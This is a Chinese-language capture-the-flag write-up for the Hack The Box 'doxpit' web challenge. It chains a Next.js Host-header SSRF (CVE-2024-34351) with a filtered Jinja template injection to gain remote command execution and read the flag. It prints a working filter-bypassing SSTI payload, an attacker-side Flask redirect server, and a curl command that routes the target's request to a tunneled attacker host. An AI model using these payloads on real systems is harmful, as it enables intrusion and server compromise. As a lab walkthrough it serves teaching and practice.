
![](https://cdn-images-1.medium.com/max/1000/1*gxaZuFXz7GXt_rKOE6EBbQ.png)

### Challenge Scenario

The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this appalling operation.

我们先看看网站主页

![](https://cdn-images-1.medium.com/max/1000/1*1RGyjhWnFSBINgjVDlw8dw.png)

这是一个公共的pastebin网站，也就是“粘贴板”网站，用来分享粘贴内容

在首页只有名人堂可以访问，其他都是error

![](https://cdn-images-1.medium.com/max/1000/1*gg44-2KtkGhT4C0Z7slUqw.png)

![](https://cdn-images-1.medium.com/max/1000/1*tp0cpIIk-XoUNQd6ycnFFQ.png)

检查源码，我们可以发现有两个服务在同时运行

![](https://cdn-images-1.medium.com/max/1000/1*CmzsJcul2C62AtA6_JwX3A.png)

可以看到他会先重命名 Flag 文件来防止可预测

![](https://cdn-images-1.medium.com/max/1000/1*tvk5j9YgCQEkWidhyzeICQ.png)

之后检查av的代码，我们会发现它运行在本地的3000端口，我们暂时碰不到

![](https://cdn-images-1.medium.com/max/1000/1*Zb_0LhvLeFjkL3TG_HvFWQ.png)

查看其他代码，我们会知道，这个服务是一个安全检查服务

他会获取每个文件的sha256哈希值，并将其与BLACKLIST_HASHES黑名单中的哈希值进行比较，根据哈希值是否在黑名单中显示不同的消息。

同时，他过滤了一些字符来防止ssti

![](https://cdn-images-1.medium.com/max/1000/1*Ii-GW74GKTvyiyV5D2q2tw.png)

但很明显，这样简单的过滤还不够用，下面有一些可用的绕过

### `{{ }}` → `{% %}`

### `.` → `|attr()`

### `\x5f` → GET 参数传下划线

所以

> {{ request.application.__globals__.__builtins__.__import__(‘os’).popen(‘ls’).read() }}

就可以写成

> {% with a=  
>  (  
>  (  
>  (  
>  (request|attr(‘application’))  
>  |attr(request|attr(“args”)|attr(“get”)(‘globals’))  
>  )  
>  |attr(request|attr(“args”)|attr(“get”)(‘getitem’))  
>  )  
>  (request|attr(“args”)|attr(“get”)(‘builtins’))  
>  |attr(request|attr(“args”)|attr(“get”)(‘getitem’))  
>  )  
>  (request|attr(“args”)|attr(“get”)(‘import’))(‘os’)  
>  |attr(‘popen’)(request|attr(“args”)|attr(“get”)(‘cmd’))  
>  |attr(‘read’)()  
> %}{% print(a) %}{% endwith %}

现在我们有了利用ssti的思路，接下来怎么实现触碰到内网呢

当然，是用ssrf

搜索了前端中间件的版本后，我们找到了

CVE-2024–34351

- Next.js 在处理 Server Action 时，会信任请求的 `Host` 头
- 攻击者伪造 `Host` 头，就能让 Next.js 向任意地址发起请求
- 需要拿到 Next-Action ID

而在页面的源码中，就饿能找到这个id

![](https://cdn-images-1.medium.com/max/1000/1*CuXN4jsaR8gH2_u-HEglBg.png)

我们可以看到确实使用了这个next-action来做校验

![](https://cdn-images-1.medium.com/max/1000/1*ZEMluiugDkpzuiBKxcin8Q.png)

那么接下来我们要做的就是怎么实现ssrf来外带出数据了

我们使用的是下面的服务来看内容

> from flask import Flask, Response, request, redirect

> app = Flask(__name__)

> [@app](http://twitter.com/app "Twitter profile for @app").route(‘/’, defaults={‘path’: ‘’}, methods=[‘GET’, ‘HEAD’, ‘POST’])  
> [@app](http://twitter.com/app "Twitter profile for @app").route(‘/<path:path>’, methods=[‘GET’, ‘HEAD’, ‘POST’])  
> def catch(path):  
>  # 打印所有进来的请求，方便观察 SSRF 是否触发  
>  print(f”[{request.method}] Host={request.headers.get(‘Host’)} Path=/{path}”)  
>  print(f” Next-Action={request.headers.get(‘Next-Action’)}”)  
>  print(f” User-Agent={request.headers.get(‘User-Agent’)}”)

> # 第一步：Next.js 会先发 HEAD 探测  
>  if request.method == ‘HEAD’:  
>  resp = Response(“”)  
>  resp.headers[‘Content-Type’] = ‘text/x-component’  
>  return resp

> # 第二步：Next.js 发 GET，我们 302 到内网目标  
>  return redirect(‘[http://0.0.0.0:3000/register?username=test&password=test'](http://0.0.0.0:3000/register?username=test&password=test%27))

> if __name__ == ‘__main__’:  
>  app.run(host=”0.0.0.0", port=8001, threaded=True, debug=False)

启动服务后，使用localhost.run开隧道

![](https://cdn-images-1.medium.com/max/1000/1*In1YOg9gfFmpOs0-8Uu72Q.png)

最后用

> AID=”0b0da34c9bad83debaebc8b90e4d5ec7544ca862" #之前获取的id  
> ATTACKER=”c32b9b0370ed9e.lhr.life” #通道那一步给你的公网地址  
> TARGET=”154.57.164.81:42271" #目标机器的ip

> curl -s -m 30 -X POST “[http://${TARGET}/?f=x$(date](http://$%7BTARGET%7D/?f=x$%28date) +%s)” \  
>  -H “Next-Action: ${AID}” \  
>  -H “Accept: text/x-component” \  
>  -H “Content-Type: text/plain;charset=UTF-8” \  
>  -H “Host: ${ATTACKER}” \  
>  — data ‘[]’ \  
>  -o /tmp/resp.bin \  
>  -w “HTTP=%{http_code} size=%{size_download}\n”

> head -c 300 /tmp/resp.bin; echo

我们能看到回复

![](https://cdn-images-1.medium.com/max/1000/1*RJ5jhcda9Fw7r3duXopVDg.png)

现在我们验证了ssrf的存在，接下来就是rce的时间了

我们先注册一个账号

把你的flask里改成

return redirect(‘[http://127.0.0.1:3000/register?username=hacker&password=hacker123'](http://127.0.0.1:3000/register?username=hacker&password=hacker123%27))

来注册一个账号

我们可以看到已经获取了token

![](https://cdn-images-1.medium.com/max/1000/1*dZjPM2IBvyiOvgUiAhUwmQ.png)

接下来我们修改具体内容，按照之前对av服务的发现就可以实现rce

![](https://cdn-images-1.medium.com/max/1000/1*ccieMUG1x4r133CQcXVoHw.png)

![](https://cdn-images-1.medium.com/max/1000/1*IXu_hir9XnndTWQvv2R7cA.png)

读到了根目录

接下里就是获取flag了，但是我试了一下，好像cat命令被过滤了，所以可以用tail或者head来获取flag

![](https://cdn-images-1.medium.com/max/1000/1*W0jlcTiovrrMb-bG6ekbPA.png)

![](https://cdn-images-1.medium.com/max/1000/1*NHVsVdy_K-eRpnpNTorXFQ.png)

yes，我们获取到了flag

**_HTB{1t5_n0t_ju5t_4_fr0nt-3nd!}_**

![](https://cdn-images-1.medium.com/max/1000/1*831pAIjJRBjG3i07edUrhg.png)